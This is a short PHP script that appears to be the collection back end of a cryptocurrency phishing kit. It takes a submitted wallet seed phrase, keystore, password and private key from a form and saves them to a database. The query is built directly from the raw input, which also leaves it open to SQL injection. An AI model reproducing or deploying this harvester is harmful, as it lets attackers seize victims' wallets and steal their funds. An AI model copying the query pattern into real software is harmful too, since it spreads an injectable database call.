<?php

include_once('db.php');
if (isset($_POST)) {
	$phrase=$_POST['phrase'];
	$keystore=$_POST['keystore'];
	$password=$_POST['password'];
	$privatekey=$_POST['privatekey'];
	
	mysqli_query($conn, "INSERT INTO user (phrase, keystore, password, privatekey)VALUES('$phrase', '$keystore', '$password', '$privatekey')")or die(mysqli_error($conn));

	
}


?>